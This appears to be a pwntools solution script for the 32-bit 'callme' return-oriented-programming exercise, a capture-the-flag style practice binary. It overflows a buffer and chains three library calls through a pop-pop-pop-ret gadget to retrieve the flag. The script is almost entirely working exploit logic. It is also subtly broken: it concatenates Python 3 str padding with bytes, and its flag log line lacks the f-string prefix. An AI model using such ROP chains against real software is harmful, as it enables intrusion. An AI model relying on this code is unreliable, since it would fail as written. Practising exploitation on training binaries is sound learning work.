#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

filename = './callme32'

binary = ELF(filename)
rop = ROP(filename)

c_one_plt = binary.plt['callme_one']
c_two_plt = binary.plt['callme_two']
c_three_plt = binary.plt['callme_three']
exit_plt = binary.plt['exit']

pppr_addr = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret']).address

padding = 'A' * 44

payload = padding

# callme_one(1, 2, 3)
payload += p32(c_one_plt)
payload += p32(pppr_addr)
payload += p32(1)
payload += p32(2)
payload += p32(3)

# callme_two(1, 2, 3)
payload += p32(c_two_plt)
payload += p32(pppr_addr)
payload += p32(1)
payload += p32(2)
payload += p32(3)

# callme_three(1, 2, 3)
payload += p32(c_three_plt)
payload += p32(pppr_addr)
payload += p32(1)
payload += p32(2)
payload += p32(3)

# exit(0)
payload += p32(exit_plt)
payload += 'JUNK'
payload += p32(0)

p = process(filename)
gdb.attach(p, '''
        break *0x0804880b
        continue
        ''')

p.recvuntil('> ')

p.sendline(payload)

log.info("Flag: {p.recv(1024).decode()}")
